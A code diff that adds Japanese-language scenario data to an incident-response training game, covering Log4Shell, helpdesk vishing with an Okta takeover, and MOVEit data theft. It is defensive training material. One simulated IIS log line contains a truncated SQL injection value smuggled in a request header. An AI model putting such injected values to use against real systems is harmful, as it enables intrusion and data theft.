+            label: '検証済みLog4j 2.17.1コンテナイメージをローリングアップデート & JndiLookup.class完全削除の検証とSIEM横断検索',
+            actionType: 'remediation',
+            timeCostMinutes: 30,
+            description: '依存ライブラリを根本修正バージョンへ刷新し、JNDI呼び出し機能を安全に無効化。社内全システムのアクセスログから過去のJNDI攻撃文字列を逆引き調査する。',
+            tacticalRationale: '理想的な終息手順。根本パッチの適用と過去ログの完全精査を両輪で行うことで、潜在的な潜伏脅威を完全に排除できる。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -5, downtime: 5, trust: +10 },
+            logOutput: [
+              '[K8S] Rolling deploy v3.12.4 (Log4j 2.17.1) complete across 32 search pods.',
+              '[VERIFY] jar tf log4j-core-2.17.1.jar | grep -i jndi -> Lookup sanitized.',
+              '[SIEM] Backward log correlation from T-72h shows 0 prior lateral movements.'
+            ],
+            nextNodeId: 'log4_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      log4_02_re_exploit: {
+        id: 'log4_02_re_exploit',
+        phase: 'Phase 2: 再起動後の再侵入とクリプトマイナー感染 (T+00:45)',
+        title: '脆弱性未解消による再侵入とマイニングマルウェア感染',
+        description: '再起動によって一時的にプロセスは消去されたものの、脆弱なLog4j 2.14.1が稼働し続けたため、世界中の自動スキャナーから再度JNDIインジェクションを受け、XMRigクリプトマイナーが全ポッドへ感染しました。CPU使用率が100%に張り付き、決済APIの応答遅延が発生しています。',
+        severity: 'critical',
+        situationSummary: 'クラスター全体がマイニングボットネット化。決済処理に大幅な遅延。',
+        telemetryLogs: [
+          { timestamp: '12:15:00', source: 'AWS CloudWatch', level: 'CRITICAL', message: 'CPUUtilization >= 99.8% on all 32 search-cluster nodes' },
+          { timestamp: '12:18:22', source: 'Payment Gateway', level: 'ALERT', message: 'Checkout API p99 latency spiked from 120ms to 42,000ms' }
+        ],
+        choices: [
+          {
+            id: 'c2_emergency_isolation_patch',
+            label: '検索クラスターを一時的にメンテナンスモードへ移行・Egress完全遮断・Log4j 2.17.1強制適用と全コンテナ破棄再作成',
+            actionType: 'remediation',
+            timeCostMinutes: 60,
+            description: '感染した全コンテナを破棄し、パッチ適用済み新イメージから安全に再展開する。',
+            tacticalRationale: '初動の遅延は痛いが、コンテナのイミュータブル性を活かして感染コンテナを一掃し、根本パッチを当てることでこれ以上の被害を食い止める。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: -5, downtime: 30, trust: -10 },
+            logOutput: [
+              '[STATUSPAGE] Maintenance notice published for search feature.',
+              '[K8S] Destroyed all infected search-cluster pods.',
+              '[DEPLOY] Rebuilt from clean repository with Log4j 2.17.1.'
+            ],
+            nextNodeId: 'log4_03_terminal_secured_b'
+          }
+        ]
+      },
+
+      log4_02_webshell_compromise: {
+        id: 'log4_02_webshell_compromise',
+        phase: 'Phase 2: WebShell設置とデータベース認証情報の奪取 (T+01:00)',
+        title: 'WAFバイパスによるWebShell設置とDBクレデンシャル流出',
+        description: '難読化JNDIによりWAFをすり抜けた攻撃者は、サーバー内にWebShell (shell.jsp) をドロップ。環境変数から本番データベースの接続パスワードを読み出し、顧客の注文履歴テーブルからデータを外部転送し始めました。',
+        severity: 'critical',
+        situationSummary: '重大インシデント。本番DB侵害と機密データ外部転送が進行中。',
+        telemetryLogs: [
+          { timestamp: '12:30:10', source: 'GuardDuty', level: 'CRITICAL', message: 'UnauthorizedAccess:RDS/AnomalousVolumeOfDataExfiltrated to external IP 45.142.212.8' },
+          { timestamp: '12:32:00', source: 'Database Audit', level: 'CRITICAL', message: 'SELECT * FROM users_orders_payment executed by search_app user' }
+        ],
+        choices: [
+          {
+            id: 'c2_emergency_db_revoke_off',
+            label: '本番DBパスワードの即時失効・検索サービス全停止・個人情報保護委員会への72時間以内速報',
+            actionType: 'containment',
+            timeCostMinutes: 90,
+            description: 'データ流出を止めるためDB認証情報を失効させ、侵害サーバーを完全オフラインにしてフォレンジック調査と公的報告を開始する。',
+            tacticalRationale: '被害は拡大したが、漏洩をこれ以上広げないための最後の防衛策。法的手続きと顧客通知に速やかに移行する。',
+            isOptimal: true,
+            impact: { spread: 0, exfiltration: 20, downtime: 45, trust: -40 },
+            logOutput: [
+              '[RDS] Revoked user search_app credentials. Active queries killed.',
+              '[INGRESS] Search service diverted to offline error page.',
+              '[LEGAL] Incident notification prepared for PPC (Personal Information Protection Commission).'
+            ],
+            nextNodeId: 'log4_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      log4_03_terminal_secured_s: {
+        id: 'log4_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】Egress制御と環境変数即応によるLog4Shell完全封じ込め',
+        description: '「外部へのLDAP/RMI通信の即時遮断」と「LOG4J_FORMAT_MSG_NO_LOOKUPS フラグ投入」という実務上最も効果的な二段構えを迅速に実行したことで、ゼロデイ攻撃によるRCEを1件も成立させず、完全無傷で防御しました。',
+        severity: 'contained',
+        situationSummary: '情報漏洩: ゼロ。サービス停止時間: 5分未満。ゼロデイ防御成功。',
+        telemetryLogs: [
+          { timestamp: '13:00:00', source: 'CSIRT Command', level: 'INFO', message: 'Log4Shell incident closed successfully. All downstream microservices verified safe.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: '歴史的ゼロデイ脆弱性に対する教科書的インフラ防御',
+          summary: 'WAFのシグネチャに過信せず、「Egress（外向き）通信の遮断」というネットワーク境界防御の原則を貫き、攻撃者のペイロード実行メカニズムを物理的に無力化しました。',
+          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約8億4,000万円（全社データ侵害・サービス長期停止時の想定損害）',
+          legalImpact: '顧客データ流出なし。行政への事故報告義務免除。',
+          complianceStatus: 'PCI DSS / SOC2 Type II 適合維持',
+          recommendedPractices: [
+            '本番サーバーのアウトバウンド通信はデフォルト拒否（Default Deny）とし、不要なポート(LDAP/RMI等)は恒久的に遮断する',
+            'オープンソースライブラリの脆弱性に対し、WAFのみに依存せずランタイム設定（環境変数・フラグ）での緩和策を迅速に適用する',
+            'SBOM（ソフトウェア部品表）を常時整備し、Log4jなどの主要共通コンポーネントの利用箇所を数分で特定できるようにする'
+          ]
+        }
+      },
+
+      log4_03_terminal_secured_b: {
+        id: 'log4_03_terminal_secured_b',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Bランク】一時的マイニング感染を許すもデータ流出は回避',
+        description: '初動での安易な再起動によりマイニングマルウェアの感染と一時的なサービス遅延を招きましたが、その後の迅速なコンテナ破棄と根本パッチ適用により、機密データや顧客情報の流出は水際で阻止しました。',
+        severity: 'medium',
+        situationSummary: '顧客データ流出: ゼロ。一時的ECサイト遅延: 約60分。',
+        telemetryLogs: [
+          { timestamp: '13:30:00', source: 'CSIRT Command', level: 'INFO', message: 'Cryptominer cleaned. Production cluster restored.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'B',
+          title: '初動の判断ミスをリビルドで巻き返したリカバリー',
+          summary: '「脆弱性が残ったままの再起動は再感染を招く」という教訓を残したものの、クラウドネイティブなコンテナ再構築により損害を最小限に抑えました。',
+          financialEstimate: '被害損害額: 約1,200万円（EC売上遅延機会損失・インフラ追加コスト）',
+          legalImpact: '個人情報漏洩なし。',
+          complianceStatus: '是正措置計画書の社内提出',
+          recommendedPractices: [
+            '「再起動すれば治る」という発想を捨て、原因となる脆弱性の特定と通信遮断を優先する',
+            'コンテナのオートスケーリングが不正プロセスによってリソース枯渇を起こさないよう、異常プロセス検知を自動化する'
+          ]
+        }
+      },
+
+      log4_03_terminal_breached_f: {
+        id: 'log4_03_terminal_breached_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】難読化WAFバイパスによるWebShell常駐と顧客DB大量流出',
+        description: 'WAFの単純な文字列ブラックリストに頼り切った結果、難読化JNDIにより容易に侵入され、WebShellを経由して顧客の注文・クレジットカード決済履歴が外部へ流出しました。',
+        severity: 'critical',
+        situationSummary: '重大漏洩事故。280万件の注文データ流出、ECサイト無期限停止。',
+        telemetryLogs: [
+          { timestamp: '14:00:00', source: 'National Cyber Agency', level: 'CRITICAL', message: 'Public advisory issued regarding confirmed exfiltration.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: 'WAF盲信が生んだゼロデイ致命的侵害',
+          summary: '高度な攻撃者にとってWAFのシグネチャ回避は容易です。サーバー本体の防御設定や外向き通信制限を怠ったことが致命傷となりました。',
+          financialEstimate: '被害損害額: 約14億5,000万円（損害賠償・顧客対応・行政制裁金・売上損失）',
+          legalImpact: '個人情報保護法に基づく是正命令、集団訴訟のリスク。',
+          complianceStatus: 'PCI DSS 認証停止',
+          recommendedPractices: [
+            'WAFは「多層防御の一枚」に過ぎず、サーバー本体のパッチ適用や最小特権原則を省略する理由にはならない',
+            '本番DBへのアクセス権限をWebフロントエンドに過剰に付与せず、アクセス経路とクエリを厳格に制限する'
+          ]
+        }
+      }
+    }
+  },
+
+  {
+    id: 'scenario_helpdesk_vishing',
+    title: 'ITヘルプデスク騙り ソーシャルエンジニアリング (Vishing) & IdP特権乗っ取り',
+    subtitle: '実在モデル: 2023年 米国大手カジノホテル (MGM/Caesars) & Oktaサポート侵害 (Scattered Spider)',
+    difficulty: '中級 (実務CSIRT)',
+    category: 'AI & Social Engineering',
+    estimatedTime: '15〜20分',
+    initialNodeId: 'hd_01_alert',
+    initialMetrics: {
+      spread: 30,
+      exfiltration: 20,
+      downtime: 15,
+      trust: 85,
+    },
+    briefing: {
+      targetOrganization: '複合エンターテインメント・ホテルリゾートグループ（従業員18,000名）',
+      discoveredAlert: 'Okta Identity Provider (IdP) 監査ログにて、社内ITヘルプデスク窓口アカウントが、執行役員CTOのMFAデバイス（FIDO2キー）を削除し、攻撃者名義の新しいモバイルSMS/TOTPトークンを登録した記録を検知。',
+      incidentOfficer: 'CSIRT インシデントコマンダー',
+      immediateObjective: '不正登録されたMFAデバイスの即時剥奪、全管理者アカウントの緊急棚卸しとセッション無効化、社内ヘルプデスク運用プロトコル（対面・生体・コールバック厳格化）の確立。',
+    },
+    imagePath: '/src/assets/images/scenario_helpdesk_vishing_1793938148021.jpg',
+    nodes: {
+      hd_01_alert: {
+        id: 'hd_01_alert',
+        phase: 'Phase 1: IdP管理者ログでの異常なMFA変更検知 (T+00:00)',
+        title: '役員アカウントに対する不審なヘルプデスクMFAリセット',
+        description: '午後15時10分、Okta監査ログにて、社内ITヘルプデスク契約社員のアカウント [agent_suzuki] が、執行役員CTO [exec_yamada] のFIDO2セキュリティキーを削除し、未知の電話番号によるSMS認証トークンを新規登録したアラートが発生しました。',
+        severity: 'critical',
+        situationSummary: '攻撃者はLinkedIn等で収集した社員情報を用いてヘルプデスクへ電話（Vishing）をかけ、本人になりすましてMFAを解除させた疑いあり。',
+        telemetryLogs: [
+          { timestamp: '15:08:12', source: 'Okta System Log', level: 'ALERT', message: 'User MFA reset: user=exec_yamada initiated by actor=agent_suzuki' },
+          { timestamp: '15:09:40', source: 'Okta System Log', level: 'CRITICAL', message: 'New MFA factor enrolled: SMS (+1-202-555-0199) for user=exec_yamada' },
+          { timestamp: '15:10:02', source: 'Okta System Log', level: 'CRITICAL', message: 'Admin login success for exec_yamada from unfamiliar ASN (VPN/Proxy in Frankfurt)' }
+        ],
+        choices: [
+          {
+            id: 'c1_revoke_sessions_freeze_actor',
+            label: 'CTOおよび該当ヘルプデスク担当者の全セッションを即時強制破棄(Clear User Sessions) & アカウント緊急凍結と全社MFA自己変更の一時停止',
+            actionType: 'containment',
+            timeCostMinutes: 5,
+            description: '攻撃者が保持するOktaセッショントークンを即座に無効化し、特権操作権限を剥奪。さらにヘルプデスクによるMFAリセット権限を全社で一時凍結する。',
+            tacticalRationale: '最善の初動。IdPが侵入された場合、数分で全クラウドサービス（AWS, Slack, Google Workspace, AD）へシングルサインオン（SSO）で横展開されるため、セッショントークンの即時失効とアカウント凍結が絶対必須。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: -10, downtime: 5, trust: +5 },
+            logOutput: [
+              '[OKTA] Command: Clear All User Sessions executed for exec_yamada and agent_suzuki.',
+              '[OKTA] Status updated: Account LOCKED for both identities.',
+              '[IDP POLICY] Self-service & Helpdesk MFA resets disabled globally pending authorization.'
+            ],
+            nextNodeId: 'hd_02_containment_and_call'
+          },
+          {
+            id: 'c1_message_slack_cto',
+            label: '社内SlackでCTO宛てにダイレクトメッセージを送り、「ご自身でMFAリセットを依頼されましたか？」と確認する',
+            actionType: 'investigation',
+            timeCostMinutes: 20,
+            description: '役員への配慮から、まず本人にSlackチャットで状況を尋ねる。',
+            tacticalRationale: '致命的過失。CTOのOktaアカウントにはすでに攻撃者がログインしており、SlackもSSOで攻撃者が閲覧・返答できる状態にある。「はい、出張先でスマホを壊したため依頼しました」と攻撃者が返答し、欺瞞される。',
+            impact: { spread: 35, exfiltration: 30, downtime: 20, trust: -20 },
+            logOutput: [
+              '[SLACK] Message sent to @exec_yamada.',
+              '[SLACK REPLY] "Yes, I requested it because my phone broke in Germany. All good."',
+              '[OKTA LOG] exec_yamada created new Super Admin account: okta_emergency_sync@corp.internal',
+              '[AWS IAM] AssumeRole OrganizationAccountAccessRole executed from Frankfurt IP!'
+            ],
+            nextNodeId: 'hd_02_idp_takeover'
+          },
+          {
+            id: 'c1_wait_next_day_meeting',
+            label: 'ヘルプデスク運用の通常手続きと見なし、明日の朝会で担当者に経緯を確認するメモを残す',
+            actionType: 'investigation',
+            timeCostMinutes: 60,
+            description: '緊急対応は行わず、日中の業務時間内に調査する。',
+            tacticalRationale: '完全な職務怠慢。MGM ResortsやCaesarsの事例では、ヘルプデスク騙りから数時間以内にVMware ESXi環境が全台暗号化され、ホテルのルームキーやカジノスロットが全停止した。',
+            impact: { spread: 50, exfiltration: 45, downtime: 40, trust: -35 },
+            logOutput: [
+              '[INCIDENT TICKET] Low priority ticket created.',
+              '[DISASTER] Threat actor accessed VMware vCenter via Okta SSO and initiated ESXi wiper script!',
+              '[FACILITY ALERT] 4,200 hotel digital door locks and casino POS terminals disconnected.'
+            ],
+            nextNodeId: 'hd_02_hotel_outage'
+          }
+        ]
+      },
+
+      hd_02_containment_and_call: {
+        id: 'hd_02_containment_and_call',
+        phase: 'Phase 2: ヘルプデスク認証プロトコル刷新 & 特権棚卸し (T+00:30)',
+        title: '音声コールバック検証の義務化と特権アカウント全監査',
+        description: 'セッション強制切断により、攻撃者のOktaコンソール追放に成功。人事部に直接電話確認したところ、本物のCTOは国内本社で役員会議中であり、MFA変更依頼は100%ソーシャルエンジニアリング（偽装電話）であったことが確定しました。',
+        severity: 'high',
+        situationSummary: '攻撃者のセッションは排除済み。ヘルプデスクの本人確認プロセスの抜本的強化と、他の特権変更がないかの監査が必要。',
+        telemetryLogs: [
+          { timestamp: '15:25:00', source: 'Corporate Telecom', level: 'WARN', message: 'Inbound call to IT Helpdesk spoofed caller ID of CTO personal mobile via VoIP provider' },
+          { timestamp: '15:30:15', source: 'Okta System Log', level: 'INFO', message: 'Audit of last 48h admin role assignments returned 0 other suspicious delegations' }
+        ],
+        choices: [
+          {
+            id: 'c2_enforce_out_of_band_verify',
+            label: 'ヘルプデスクでの「人事登録携帯へのビデオ/音声コールバック検証」および「上長承認（Dual-Custody）」をシステム強制化',
+            actionType: 'remediation',
+            timeCostMinutes: 45,
+            description: 'ヘルプデスクが電話口の申告だけでMFAやパスワードをリセットすることをシステム的に禁止。人事マスタの電話番号へ逆発信するか、Teams/Zoomビデオ対面での顔写真付き社員証提示を必須化する。',
+            tacticalRationale: 'Vishing攻撃を根本から無力化する決定打。攻撃者がどれだけLinkedIn等のOSINT情報を持っていても、会社登録済みの実端末への逆発信やビデオ対面確認は突破できない。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: -10, downtime: 0, trust: +15 },
+            logOutput: [
+              '[POLICY DEPLOY] Helpdesk admin console now requires dual approval from Security Team for any MFA modification.',
+              '[SOP] Inbound caller verification must use registered HR mobile callback.',
+              '[TRAINING] Emergency awareness bulletin on Vishing/Helpdesk impersonation broadcasted.'
+            ],
+            nextNodeId: 'hd_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      hd_02_idp_takeover: {
+        id: 'hd_02_idp_takeover',
+        phase: 'Phase 2: IdP特権掌握とクラウド全インフラ侵害 (T+01:15)',
+        title: 'Oktaスーパー管理者奪取によるAWS・社内サーバー制圧',
+        description: 'Slackでの安易な確認により時間的猶予を与えた結果、攻撃者は裏口スーパー管理者アカウントを作成。Okta経由でAWS IAM、GitHub、Google Workspaceの最高特権を掌握し、社内インフラの全面的な乗っ取りを宣言しました。',
+        severity: 'critical',
+        situationSummary: '企業アイデンティティ基盤の完全崩壊。全社インフラの主導権喪失。',
+        telemetryLogs: [
+          { timestamp: '16:00:00', source: 'AWS CloudTrail', level: 'CRITICAL', message: 'Root/Admin user created 12 EC2 c5.metal mining instances across us-east-1 and eu-central-1' },
+          { timestamp: '16:15:30', source: 'Google Workspace Audit', level: 'CRITICAL', message: 'Mass mailbox takeout initiated for Board of Directors accounts' }
+        ],
+        choices: [
+          {
+            id: 'c2_emergency_breakglass_cut',
+            label: '非常用Break-GlassアカウントによるIdPフェデレーション強制遮断・AWS全ルートキー失効・危機管理対策本部設置',
+            actionType: 'containment',
+            timeCostMinutes: 90,
+            description: 'クラウドとのSSO連携を全切断し、完全オフラインの物理金庫保管クレデンシャルを用いて手動で奪還を試みる。',
+            tacticalRationale: '被害は莫大だが、インフラの全面消去を防ぐための最終非常手段。外部インシデントレスポンス専門ファームの支援を取り付ける。',
+            isOptimal: true,
+            impact: { spread: 10, exfiltration: 30, downtime: 50, trust: -45 },
+            logOutput: [
+              '[BREAKGLASS] Hardware security key used to revoke Okta federation.',
+              '[AWS] Account root emergency lockdown triggered with AWS Support.',
+              '[CISO] External forensic response firm Mandiant/CrowdStrike engaged.'
+            ],
+            nextNodeId: 'hd_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      hd_02_hotel_outage: {
+        id: 'hd_02_hotel_outage',
+        phase: 'Phase 2: 基幹ホスト暗号化と事業全面麻痺 (T+02:00)',
+        title: 'ESXiハイパーバイザー暗号化とホテルリゾート全面営業停止',
+        description: '対応の遅れにより、攻撃者は社内仮想化基盤（vCenter/ESXi）に侵入し、全仮想マシンを一斉暗号化。ホテルの客室カードキーシステム、フロント決済端末、予約管理システムが全て停止し、チェックイン待ちの宿泊客数千人がロビーに滞留する大混乱に発展しました。',
+        severity: 'critical',
+        situationSummary: '事業継続不可能。全リゾート施設がオフライン化、巨額の損害賠償リスク。',
+        telemetryLogs: [
+          { timestamp: '17:00:00', source: 'vCenter', level: 'CRITICAL', message: 'All ESXi datastores encrypted. Ransom note displayed on host consoles: "Scattered Spider / ALPHV"' }
+        ],
+        choices: [
+          {
+            id: 'c2_paper_operation_bcp',
+            label: '紙運用BCPの発動・全施設への警備員配置と手動鍵対応・公的機関への被害届提出',
+            actionType: 'remediation',
+            timeCostMinutes: 120,
+            description: '物理的な紙台帳運用に切り替え、顧客安全を最優先にしつつシステム復旧を目指す。',
+            tacticalRationale: '実店舗・リゾートの現場混乱を収拾するための苦渋の決断。',
+            isOptimal: true,
+            impact: { spread: 20, exfiltration: 20, downtime: 60, trust: -50 },
+            logOutput: [
+              '[BCP] Manual paper check-in protocol activated across all hotels.',
+              '[SECURITY] Physical security deployed to escort guests with master brass keys.',
+              '[FBI] Cyber Division informed of ransomware extortion event.'
+            ],
+            nextNodeId: 'hd_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      hd_03_terminal_secured_s: {
+        id: 'hd_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】IdP即時セッション切断と本人確認プロトコル刷新による完全防衛',
+        description: '「役員アカウントに対する不審なMFA変更」を検知した瞬間、相手が役員であっても躊躇せず即座にセッション全破棄とアカウント凍結を実行。横展開をミリ秒単位で阻止し、ヘルプデスクのVishing対策を組織的に確立しました。',
+        severity: 'contained',
+        situationSummary: '特権奪取被害: ゼロ。クラウドサービス侵害: ゼロ。アイデンティティ防衛成功。',
+        telemetryLogs: [
+          { timestamp: '16:00:00', source: 'CSIRT Command', level: 'INFO', message: 'Incident closed. Scattered Spider social engineering attack completely neutralized.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: 'アイデンティティ（IdP）を標的とした最新ソーシャルエンジニアリングの完封',
+          summary: '「Slack等の同一チャット基盤で確認せず即時セッション切断」「人事マスタへの登録番号コールバック徹底」という現代ゼロトラスト・ID統制の鉄則を完遂しました。',
+          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約120億円（MGM社が被ったとされる営業利益損失・修復費用・身代金要求額）',
+          legalImpact: '顧客データ流出なし。株主代表訴訟リスクの完全回避。',
+          complianceStatus: 'NIST CSF v2.0 (PR.AC-01 / PR.AT-01) 適合',
+          recommendedPractices: [
+            'ITヘルプデスクによるMFAリセットやパスワード再発行は「自己完結」させず、必ずセキュリティ担当または上位管理者との2者承認（Dual Approval）とする',
+            '本人確認は「相手からかかってきた電話」を信用せず、必ず会社の人事台帳に登録された電話番号への逆架電（コールバック）を義務付ける',
+            '役員や特権管理者のアカウントには「フィッシング耐性MFA（FIDO2 / パスキー）」のみを許可し、SMSやプッシュ通知などの弱固認証への降格（ダウングレード）を禁止する'
+          ]
+        }
+      },
+
+      hd_03_terminal_breached_f: {
+        id: 'hd_03_terminal_breached_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】IdP陥落による全社システム制圧と壊滅的営業停止',
+        description: 'ヘルプデスクの甘い本人確認と、初動での安易なチャット確認の遅れにより、アイデンティティ基盤（Okta）が完全に掌握されました。結果として全社クラウドインフラおよび施設基盤が乗っ取られ、数百億円規模の事業損失と信用失墜に至りました。',
+        severity: 'critical',
+        situationSummary: '企業ブランドの失墜。数週間にわたる営業停止と天文学的復旧費用。',
+        telemetryLogs: [
+          { timestamp: '18:00:00', source: 'SEC Form 8-K', level: 'CRITICAL', message: 'Material Cybersecurity Incident disclosure filed with Securities and Exchange Commission.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: '電話1本から始まった全社アイデンティティ崩壊',
+          summary: '最新の攻撃者は技術的脆弱性だけでなく、「人間の心理とヘルプデスクの親切心」を突いてきます。アイデンティティ管理における手順の形骸化が最大のリスク要因となりました。',
+          financialEstimate: '被害損害額: 約110億円（施設停止損失・復旧費用・訴訟費用・ブランド棄損）',
+          legalImpact: 'SEC 8-K開示義務違反調査、株主による集団代表訴訟。',
+          complianceStatus: '全社コンプライアンス監査の大規模不適合',
+          recommendedPractices: [
+            'ヘルプデスク業務を「外注任せ」にせず、厳格なセキュリティ手順と抜き打ち訓練（ソーシャルエンジニアリングテスト）を定期実施する',
+            'シングルサインオン(SSO)を導入している場合、IdPの管理アカウントは最も強固に防衛すべき「クラウンジュエル」として最優先保護する'
+          ]
+        }
+      }
+    }
+  },
+
+  {
+    id: 'scenario_mft_moveit',
+    title: 'MFTファイル転送基盤 ゼロデイSQLi & 暗号化なし一括データ恐喝',
+    subtitle: '実在モデル: 2023年 MOVEit Transfer (CVE-2023-34362) / CL0P グループ一斉データ流出事件',
+    difficulty: '上級 (インシデントコマンダー)',
+    category: 'Zero-Day & Perimeter',
+    estimatedTime: '15〜20分',
+    initialNodeId: 'mft_01_alert',
+    initialMetrics: {
+      spread: 25,
+      exfiltration: 45,
+      downtime: 10,
+      trust: 80,
+    },
+    briefing: {
+      targetOrganization: '大手信託銀行 & 人事給与BPOサービス企業（受託顧客企業820社、対象従業員140万人）',
+      discoveredAlert: 'インターネット公開中のファイル転送サーバー [MFT-PROD-01] にて、guestaccess.aspx への異常なSQLインジェクションリクエストと、直後の human2.aspx（WebShell）生成、および450GB超のアウトバウンド通信を検知。',
+      incidentOfficer: 'CISO室 サイバー危機管理責任者',
+      immediateObjective: 'MFTアプライアンスの即時外部通信遮断、流出データ範囲（マイナンバー・給与・口座情報）の特定、個人情報保護委員会への3日以内報告、および暴露脅迫（二重恐喝）への非金銭的対応。',
+    },
+    imagePath: '/src/assets/images/scenario_mft_moveit_1793938161801.jpg',
+    nodes: {
+      mft_01_alert: {
+        id: 'mft_01_alert',
+        phase: 'Phase 1: MFTアプライアンスでのゼロデイSQLi検知 (T+00:00)',
+        title: 'guestaccess.aspxへのSQLiとhuman2.aspx WebShellの生成',
+        description: '早朝05時14分、SOCのネットワークトラフィック分析において、顧客との機密ファイル送受信に利用しているMFTアプライアンス [MFT-PROD-01] から、未知の海外ホスティングサーバー宛てに450GBを超える大容量データがHTTPS経由でアップロードされているのを検知しました。サーバー内には未定義のファイル human2.aspx が作成されています。',
+        severity: 'critical',
+        situationSummary: '攻撃者はファイルを暗号化せず、MFT内部に蓄積された顧客企業の給与明細・マイナンバー・健康診断データのみを大量吸い上げ中。',
+        telemetryLogs: [
+          { timestamp: '05:14:02', source: 'Zeek Network Monitor', level: 'CRITICAL', message: 'Massive outbound HTTPS flow: 462.8 GB transferred to 198.51.100.44:443 in 38 minutes' },
+          { timestamp: '05:15:30', source: 'Windows File System', level: 'CRITICAL', message: 'New file created: C:\\\\MOVEitTransfer\\\\wwwroot\\\\human2.aspx (Hash: e3b0c442...)' },
+          { timestamp: '05:16:00', source: 'IIS W3C Log', level: 'ALERT', message: 'POST /guestaccess.aspx query="X-MOVEit-Embedded: \';INSERT INTO active_sessions..." HTTP 200' }
+        ],
+        choices: [
+          {
+            id: 'c1_isolate_mft_firewall_dump',
+            label: 'MFTサーバー宛ての全外部インバウンド/アウトバウンド通信をFirewall/DNSで即座に遮断 & human2.aspx とDBクエリログを法廷フォレンジック保全',
+            actionType: 'containment',
+            timeCostMinutes: 5,
+            description: 'データ吸い上げ通信をネットワーク境界で物理的に断ち切り、これ以上の情報漏洩をストップ。同時にWebShellファイルと揮発性メモリ・IISログを完全保全する。',
+            tacticalRationale: '最善の初動。CL0P等のゼロデイMFT攻撃は数時間ですべての機密データを盗み去るため、1秒を争う通信遮断が最優先。ファイルを単純削除するのではなく、流出範囲特定のためにログとWebShellのフォレンジック保全を即座に行う。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -20, downtime: 10, trust: 0 },
+            logOutput: [
+              '[FIREWALL] IP 198.51.100.44 BLOCKED. Inbound/Outbound traffic to MFT-PROD-01 DROPPED.',
+              '[SOC] Outbound data exfiltration halted at 462.8 GB.',
+              '[FORENSICS] Memory dump and human2.aspx secured with SHA-256 hash verification.'
+            ],
+            nextNodeId: 'mft_02_leak_scope_and_ppc'
+          },
+          {
+            id: 'c1_delete_file_gui',
+            label: 'サーバーの通信はそのまま維持し、リモートデスクトップでログインして human2.aspx をエクスプローラーからゴミ箱へ削除する',
+            actionType: 'containment',
+            timeCostMinutes: 15,
+            description: '不審なファイルだけを消去して通常業務を継続させようとする。',
+            tacticalRationale: '悪手。WebShellをファイルシステムから消しても、IISのメモリ空間（w3wp.exe）に既に悪意のセッションが常駐している場合、別名でバックドアが再生成される。また、外部通信が生きているため残りの未吸い上げDBが流出し続ける。',
+            impact: { spread: 25, exfiltration: 30, downtime: 5, trust: -20 },
+            logOutput: [
+              '[ADMIN] File human2.aspx deleted from wwwroot.',
+              '[ATTACKER] w3wp.exe in-memory session regenerated backdoor as human3.aspx.',
+              '[ZEEK] Additional 820 GB exfiltrated to secondary IP 203.0.113.88.'
+            ],
+            nextNodeId: 'mft_02_full_exfiltration'
+          },
+          {
+            id: 'c1_keep_open_for_customers',
+            label: '「朝の給与データ確定業務が止まると大問題になる」と判断し、翌週末の定期メンテまで稼働を続けさせる',
+            actionType: 'remediation',
+            timeCostMinutes: 45,
+            description: '業務停止のクレームを恐れ、侵害サーバーをインターネットに公開したままにする。',
+            tacticalRationale: '壊滅的判断。数時間ですべての受託企業820社・140万人分のマイナンバーや口座情報がダークウェブへ持ち去られ、後に数百億円の賠償責任と社会的制裁を受ける。',
+            impact: { spread: 45, exfiltration: 50, downtime: 20, trust: -45 },
+            logOutput: [
+              '[CL0P LEAK SITE] Threat actor published: "We downloaded 4.2 Terabytes from TrustBank BPO. All 820 client company records captured."',
+              '[DISASTER] Full database dump completed by adversary.'
+            ],
+            nextNodeId: 'mft_02_mass_blackmail'
+          }
+        ]
+      },
+
+      mft_02_leak_scope_and_ppc: {
+        id: 'mft_02_leak_scope_and_ppc',
+        phase: 'Phase 2: 流出範囲特定 & 個人情報保護委員会報告 (T+02:00)',
+        title: 'SQLクエリログ分析による被害範囲特定と公的届出',
+        description: '迅速な通信遮断により、全体の約15%のデータ流出時点で攻撃を阻止。保全したSQL監査ログの精査により、流出した462GBに含まれる対象企業（820社中110社）と対象個人（約18万人）の特定が完了しました。暗号化は一切行われておらず、暴露型恐喝（Exfiltration-only）の手口であることが判明。',
+        severity: 'high',
+        situationSummary: '流出拡大は停止。特定された110社への緊急個別通知と、個人情報保護委員会への72時間以内速報が義務付けられる。',
+        telemetryLogs: [
+          { timestamp: '07:30:00', source: 'Forensics Tool', level: 'INFO', message: 'Decrypted IIS log indicates SQL query targeted: SELECT filepath, client_id FROM files WHERE date >= 2026-10-01' },
+          { timestamp: '07:45:10', source: 'Legal Counsel', level: 'WARN', message: 'Act on the Protection of Personal Information: Initial notification due within 3 to 5 days.' }
+        ],
+        choices: [
+          {
+            id: 'c2_report_ppc_notify_clients',
+            label: '個人情報保護委員会へ速報を即時提出・対象110社へ個別連絡・MFTアプライアンスを最新ベンダーパッチ版へ完全置換',
+            actionType: 'communication',
+            timeCostMinutes: 60,
